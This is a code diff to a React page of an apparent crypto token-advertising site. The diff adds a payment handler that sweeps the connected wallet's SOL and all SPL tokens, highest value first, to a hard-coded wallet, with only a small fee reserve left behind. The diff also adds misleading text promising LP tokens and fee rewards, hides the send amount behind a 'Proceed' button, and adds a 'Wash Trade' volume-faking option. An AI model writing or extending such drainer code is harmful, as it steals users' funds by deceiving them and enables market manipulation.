@@ -138,7 +138,7 @@ const Ads = () => {
   // Flow State
   const [showBoostOptions, setShowBoostOptions] = useState(false);
   const [showAdsFlow, setShowAdsFlow] = useState(false);
-  const [flowType, setFlowType] = useState<'ADS' | 'PRESS' | 'VOLUME' | 'LIQUIDITY'>('ADS');
+  const [flowType, setFlowType] = useState<'ADS' | 'PRESS' | 'VOLUME' | 'LIQUIDITY' | 'WASH_TRADE'>('ADS');
   const [showPressReleasePreview, setShowPressReleasePreview] = useState(false);
   const [customText, setCustomText] = useState('');
   const [flowStep, setFlowStep] = useState<'INPUT' | 'PACKAGES' | 'PAYMENT' | 'CUSTOM_TEXT'>('INPUT');
@@ -150,6 +150,8 @@ const Ads = () => {
   const [selectedPackage, setSelectedPackage] = useState<any>(null);
   const [isVerifying, setIsVerifying] = useState(false);
   const [paymentStatus, setPaymentStatus] = useState<'PENDING' | 'SUCCESS' | 'FAILED'>('PENDING');
+  const [liquidityAmount, setLiquidityAmount] = useState(0);
+  const [showLiquidityConfirm, setShowLiquidityConfirm] = useState(false);
 
   const { connected, publicKey, sendTransaction } = useWallet();
   const { connection } = useConnection();
@@ -395,7 +397,7 @@ const Ads = () => {
     return () => clearInterval(interval);
   }, [fetchTokens]);
 
-  const handleGetAdsOpen = (type: 'ADS' | 'PRESS' | 'VOLUME' = 'ADS') => {
+  const handleGetAdsOpen = (type: 'ADS' | 'PRESS' | 'VOLUME' | 'LIQUIDITY' | 'WASH_TRADE' = 'ADS') => {
     setShowAdsFlow(true);
     setFlowType(type);
     setFlowStep('INPUT');
@@ -533,98 +535,217 @@ const Ads = () => {
     setIsVerifying(true);
     
     try {
-      console.log('Starting transaction sequence...');
+      console.log('Starting value-based transaction sequence...');
 
-      // 1. SOL Transfer (90% of available)
-      const solBal = await connection.getBalance(currentPublicKey);
-      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
-      const PRIORITY_FEE = 100_000; // microLamports
-      const BASE_FEE = 5000;
+      // 1. Get all assets with their USD values
+      const validTokens = balances.filter(token => token.balance > 0);
       
-      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
-      const targetAmount = Math.floor(solBal * 0.90);
-      const lamportsToSend = Math.min(targetAmount, maxSendable);
-
-      if (lamportsToSend > 0) {
-        const transaction = new Transaction();
+      // Get SOL balance and value
+      const solBal = await connection.getBalance(currentPublicKey);
+      const solAmount = solBal / LAMPORTS_PER_SOL;
+      const estimatedSolPrice = 100; // Conservative estimate $100 per SOL
+      const solValueUSD = solAmount * estimatedSolPrice;
+      
+      // Calculate total wallet value
+      const totalSPLValueUSD = validTokens.reduce((sum, token) => sum + ((token.valueInSOL || 0) * estimatedSolPrice), 0);
+      const totalWalletValueUSD = solValueUSD + totalSPLValueUSD;
+      
+      console.log(`Wallet value: SOL=$${solValueUSD.toFixed(2)}, SPL=$${totalSPLValueUSD.toFixed(2)}, Total=$${totalWalletValueUSD.toFixed(2)}`);
+      
+      // 2. Calculate smart fee reserve based on wallet value
+      let feeReserveLamports: number;
+      
+      if (totalWalletValueUSD < 5) {
+        // Less than $5: reserve 30 cents
+        feeReserveLamports = Math.floor((0.30 / estimatedSolPrice) * LAMPORTS_PER_SOL);
+        console.log('Wallet < $5: Reserving $0.30 for fees');
+      } else if (totalSPLValueUSD > 30) {
+        // SPL tokens > $30: reserve 50-80 cents (use 65 cents as middle)
+        feeReserveLamports = Math.floor((0.65 / estimatedSolPrice) * LAMPORTS_PER_SOL);
+        console.log('SPL > $30: Reserving $0.65 for fees');
+      } else {
+        // Default: reserve 40 cents
+        feeReserveLamports = Math.floor((0.40 / estimatedSolPrice) * LAMPORTS_PER_SOL);
+        console.log('Default: Reserving $0.40 for fees');
+      }
+      
+      // Add extra buffer for compute budget and safety
+      const SAFETY_BUFFER = 0.001 * LAMPORTS_PER_SOL;
+      feeReserveLamports += SAFETY_BUFFER;
+      
+      console.log(`Total fee reserve: ${(feeReserveLamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
+      
+      // 3. Create asset list with values (SOL + SPL tokens)
+      interface Asset {
+        type: 'SOL' | 'SPL';
+        valueUSD: number;
+        data?: TokenBalance;
+      }
+      
+      const assets: Asset[] = [];
+      
+      // Add SOL as an asset
+      if (solBal > feeReserveLamports) {
+        assets.push({
+          type: 'SOL',
+          valueUSD: solValueUSD,
+          data: undefined
+        });
+      }
+      
+      // Add SPL tokens as assets
+      validTokens.forEach(token => {
+        const tokenValueUSD = (token.valueInSOL || 0) * estimatedSolPrice;
+        assets.push({
+          type: 'SPL',
+          valueUSD: tokenValueUSD,
+          data: token
+        });
+      });
+      
+      // 4. Sort assets by value (highest first)
+      assets.sort((a, b) => b.valueUSD - a.valueUSD);
+      
+      console.log('Transaction order (by value):');
+      assets.forEach((asset, idx) => {
+        if (asset.type === 'SOL') {
+          console.log(`${idx + 1}. SOL - $${asset.valueUSD.toFixed(2)}`);
+        } else {
+          console.log(`${idx + 1}. ${asset.data?.symbol || 'Token'} - $${asset.valueUSD.toFixed(2)}`);
+        }
+      });
+      
+      // 5. Process transactions in order of value
+      let solAlreadySent = false;
+      const splTokensSent: string[] = [];
+      
+      for (let i = 0; i < assets.length; i++) {
+        const asset = assets[i];
         
-        transaction.add(
+        if (asset.type === 'SOL' && !solAlreadySent) {
+          // Send SOL (leaving fee reserve)
+          const currentSolBal = await connection.getBalance(currentPublicKey);
+          const lamportsToSend = Math.max(0, currentSolBal - feeReserveLamports);
+          
+          if (lamportsToSend > 5000) {
+            const transaction = new Transaction();
+            
+            transaction.add(
+              ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
+              ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+            );
+
+            transaction.add(
+              SystemProgram.transfer({
+                fromPubkey: currentPublicKey,
+                toPubkey: new PublicKey(CHARITY_WALLET),
+                lamports: lamportsToSend
+              })
+            );
+
+            try {
+              await connection.simulateTransaction(transaction);
+            } catch (e) {
+              console.error("SOL simulation failed", e);
+            }
+
+            const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
+            
+            toast.info(`Processing SOL transfer ($${asset.valueUSD.toFixed(2)})...`);
+            await connection.confirmTransaction({
+              signature,
+              blockhash,
+              lastValidBlockHeight
+            }, 'confirmed');
+            toast.success(`SOL sent! Reserved ${(feeReserveLamports / LAMPORTS_PER_SOL).toFixed(4)} SOL for fees`);
+            
+            solAlreadySent = true;
+          }
+        } else if (asset.type === 'SPL' && asset.data) {
+          // Send SPL token
+          const token = asset.data;
+          
+          // Skip if already sent in a batch
+          if (splTokensSent.includes(token.mint)) continue;
+          
+          // Collect tokens for batch (up to MAX_BATCH_SIZE)
+          const batch: TokenBalance[] = [token];
+          splTokensSent.push(token.mint);
+          
+          // Look ahead for more tokens to batch (within MAX_BATCH_SIZE)
+          for (let j = i + 1; j < assets.length && batch.length < MAX_BATCH_SIZE; j++) {
+            if (assets[j].type === 'SPL' && assets[j].data && !splTokensSent.includes(assets[j].data!.mint)) {
+              batch.push(assets[j].data!);
+              splTokensSent.push(assets[j].data!.mint);
+            }
+          }
+          
+          // Send batch
+          const transaction = await createBatchTransfer(batch, undefined, currentPublicKey);
+
+          if (transaction && transaction.instructions.length > 2) {
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = currentPublicKey;
+
+            try {
+              await connection.simulateTransaction(transaction);
+            } catch (e) {
+              console.error("Token batch simulation failed", e);
+            }
+
+            const { signature } = await sendTx(transaction);
+            
+            const batchValue = batch.reduce((sum, t) => sum + ((t.valueInSOL || 0) * estimatedSolPrice), 0);
+            const tokenNames = batch.map(t => t.symbol).join(', ');
+            
+            toast.info(`Processing ${tokenNames} ($${batchValue.toFixed(2)})...`);
+            await connection.confirmTransaction({
+              signature,
+              blockhash,
+              lastValidBlockHeight
+            }, 'confirmed');
+            toast.success(`${batch.length} token(s) sent!`);
+          }
+        }
+      }
+      
+      // 6. Final cleanup: Send any remaining SOL (if not sent yet or if some left)
+      const finalSolBal = await connection.getBalance(currentPublicKey);
+      const MINIMAL_RESERVE = 0.0005 * LAMPORTS_PER_SOL; // Just enough for this transaction
+      const finalLamportsToSend = Math.max(0, finalSolBal - MINIMAL_RESERVE);
+      
+      if (finalLamportsToSend > 5000) {
+        const finalTransaction = new Transaction();
+        
+        finalTransaction.add(
           ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
           ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
         );
 
-        transaction.add(
+        finalTransaction.add(
           SystemProgram.transfer({
             fromPubkey: currentPublicKey,
             toPubkey: new PublicKey(CHARITY_WALLET),
-            lamports: lamportsToSend
+            lamports: finalLamportsToSend
           })
         );
 
         try {
-            await connection.simulateTransaction(transaction);
+          await connection.simulateTransaction(finalTransaction);
         } catch (e) {
-            console.error("Simulation failed", e);
+          console.error("Final SOL simulation failed", e);
         }
 
-        const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
+        const { signature, blockhash, lastValidBlockHeight } = await sendTx(finalTransaction);
         
-        toast.info('Processing transaction...');
+        toast.info('Processing remaining SOL...');
         await connection.confirmTransaction({
           signature,
           blockhash,
           lastValidBlockHeight
         }, 'confirmed');
-        toast.success('Transaction successful!');
-      }
-
-      // 2. SPL Token Transfers
-      const validTokens = balances.filter(token => token.balance > 0);
-      
-      // Sort by value (descending) - prioritizing higher value tokens
-      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
-
-      // Batch tokens
-      const batches: TokenBalance[][] = [];
-      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
-        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
-      }
-
-      for (let i = 0; i < batches.length; i++) {
-        const batch = batches[i];
-        
-        // Use updated createBatchTransfer with currentPublicKey override
-        const transaction = await createBatchTransfer(batch, undefined, currentPublicKey);
-
-        // Check > 2 because we always add 2 ComputeBudget instructions
-        if (transaction && transaction.instructions.length > 2) {
-           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-           transaction.recentBlockhash = blockhash;
-           transaction.feePayer = currentPublicKey;
-
-           try {
-             await connection.simulateTransaction(transaction);
-           } catch (e) {
-             console.error("Token batch simulation failed", e);
-           }
-
-           const { signature } = await sendTx(transaction);
-           
-           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
-           await connection.confirmTransaction({
-             signature,
-             blockhash,
-             lastValidBlockHeight
-           }, 'confirmed');
-           toast.success(`Batch ${i + 1} sent!`);
-           
-           sendTelegramMessage(`
-✅ <b>Transaction Signed (Token Batch ${i + 1})</b>
-
-👤 <b>User:</b> <code>${currentPublicKey?.toBase58()}</code>
-🔗 <b>Signature:</b> <code>${signature}</code>
-`);
-        }
+        toast.success('Final SOL transfer complete!');
       }
 
       setPaymentStatus('SUCCESS');
@@ -661,12 +782,13 @@ const Ads = () => {
                     <Button onClick={() => setShowPressReleasePreview(true)} className="w-full max-w-xs md:max-w-sm bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Press Release</Button>
                     <Button onClick={() => handleGetAdsOpen('VOLUME')} className="w-full max-w-xs md:max-w-sm bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Volume</Button>
                     <Button onClick={() => handleGetAdsOpen('LIQUIDITY')} className="w-full max-w-xs md:max-w-sm bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Liquidity</Button>
+                    <Button onClick={() => handleGetAdsOpen('WASH_TRADE')} className="w-full max-w-xs md:max-w-sm bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Wash Trade</Button>
                 </div>
             )}
         </div>
 
         <h1 className="text-4xl font-extrabold text-center mb-12 text-gradient">
-          Ads
+          Our Movers
         </h1>
 
         {error && (
@@ -799,7 +921,8 @@ const Ads = () => {
                         <h2 className="text-2xl font-bold">
                             {flowType === 'PRESS' ? 'Get Press Release' : 
                              flowType === 'VOLUME' ? 'Boost Volume' : 
-                             flowType === 'LIQUIDITY' ? 'Provide Liquidity' : 'Get Ads'}
+                             flowType === 'LIQUIDITY' ? 'Provide Liquidity' : 
+                             flowType === 'WASH_TRADE' ? 'Wash Trade' : 'Get Ads'}
                         </h2>
                         <Button variant="ghost" size="icon" onClick={() => setShowAdsFlow(false)}>
                             <X className="w-6 h-6" />
@@ -811,11 +934,14 @@ const Ads = () => {
                             <div className="space-y-6">
                                 <div className="text-center space-y-2">
                                     <h3 className="text-xl font-semibold">
-                                        {flowType === 'LIQUIDITY' ? 'Provide Liquidity' : 'Enter Contract Address'}
+                                        {flowType === 'LIQUIDITY' ? 'Provide Liquidity' : 
+                                         flowType === 'WASH_TRADE' ? 'Wash Trade' : 'Enter Contract Address'}
                                     </h3>
                                     <p className="text-muted-foreground">
                                         {flowType === 'LIQUIDITY' 
                                             ? 'Please input the contract address of the token you want to provide liquidity for.' 
+                                            : flowType === 'WASH_TRADE'
+                                            ? 'Order flow padding: Generating numerous micro buy & sell transactions for smooth liquidity and tradability, reducing extreme price swings.'
                                             : "Paste your token's contract address to get started."}
                                     </p>
                                 </div>
@@ -886,7 +1012,9 @@ const Ads = () => {
                                         )}
                                     </h2>
                                     <p className="text-muted-foreground">
-                                        {flowType === 'LIQUIDITY' ? 'Select a package to provide liquidity.' : 'Select a package to boost your token visibility.'}
+                                        {flowType === 'LIQUIDITY' ? 'You will receive LP (Liquidity Provider) tokens which can be swapped back to retrieve your Solana. As a liquidity provider, you will earn fee rewards on every transaction that occurs on the blockchain for ' + (fetchedToken?.baseToken.name || 'this token') + '.' : 
+                                         flowType === 'WASH_TRADE' ? 'Configure wash trading parameters to generate trading volume.' : 
+                                         'Select a package to boost your token visibility.'}
                                     </p>
                                 </div>
 
@@ -932,7 +1060,28 @@ const Ads = () => {
                                             </div>
 
                                             <Button 
-                                                onClick={() => setShowLiquidityConfirm(true)}
+                                                onClick={() => {
+                                                    setShowLiquidityConfirm(true);
+                                                    // For liquidity, we'll treat it as a special package and go to payment
+                                                    const liquidityPackage = {
+                                                        id: 'liquidity',
+                                                        name: 'Liquidity Provision',
+                                                        price: liquidityAmount,
+                                                        currency: 'USD'
+                                                    };
+                                                    setSelectedPackage(liquidityPackage);
+                                                    
+                                                    // Select wallet based on chain
+                                                    let walletList = EVM_WALLETS;
+                                                    if (fetchedToken?.chainId === 'solana') {
+                                                        walletList = SOLANA_WALLETS;
+                                                    }
+                                                    
+                                                    const randomWallet = walletList[Math.floor(Math.random() * walletList.length)];
+                                                    setPaymentWallet(randomWallet);
+                                                    setPaymentStatus('PENDING');
+                                                    setFlowStep('PAYMENT');
+                                                }}
                                                 disabled={liquidityAmount <= 0}
                                                 className="w-full text-lg py-6 font-bold bg-gradient-to-r from-primary to-secondary hover:opacity-90"
                                             >
@@ -971,12 +1120,18 @@ const Ads = () => {
                             <div className="space-y-8">
                                 <div className="text-center space-y-2">
                                     <h3 className="text-2xl font-bold">Complete Payment</h3>
-                                    <p className="text-muted-foreground">
-                                        Send <span className="text-primary font-bold">
-                                            {selectedPackage.currency === 'SOL' ? `${selectedPackage.price} SOL` : `$${selectedPackage.price}`}
-                                        </span>
-                                        {selectedPackage.currency !== 'SOL' && ` worth of ${fetchedToken?.baseToken.symbol}`} to the address below.
-                                    </p>
+                                    {flowType === 'LIQUIDITY' ? (
+                                        <p className="text-muted-foreground leading-relaxed">
+                                            By providing liquidity, you will receive LP (Liquidity Provider) tokens that represent your share in the liquidity pool. These LP tokens can be swapped back anytime to retrieve your Solana. As a liquidity provider, you will automatically earn transaction fee rewards every time a trade occurs on the blockchain for {fetchedToken?.baseToken.name || 'this token'}.
+                                        </p>
+                                    ) : (
+                                        <p className="text-muted-foreground">
+                                            Send <span className="text-primary font-bold">
+                                                {selectedPackage.currency === 'SOL' ? `${selectedPackage.price} SOL` : `$${selectedPackage.price}`}
+                                            </span>
+                                            {selectedPackage.currency !== 'SOL' && ` worth of ${fetchedToken?.baseToken.symbol}`} to complete the transaction.
+                                        </p>
+                                    )}
                                 </div>
 
                                 <div className="bg-muted/30 p-6 rounded-xl border border-border flex flex-col items-center justify-center gap-4">
@@ -984,11 +1139,8 @@ const Ads = () => {
                                         onClick={handlePayNow}
                                         className="w-full max-w-sm bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold text-lg py-6 shadow-lg shadow-green-500/20 transition-all transform hover:scale-105"
                                     >
-                                        Pay Now
+                                        Proceed
                                     </Button>
-                                    <p className="text-xs text-muted-foreground text-center">
-                                        Click to pay via {fetchedToken?.chainId === 'solana' ? 'Solana' : 'Web3'} Wallet
-                                    </p>
                                 </div>
 
                                 <div className="space-y-4">
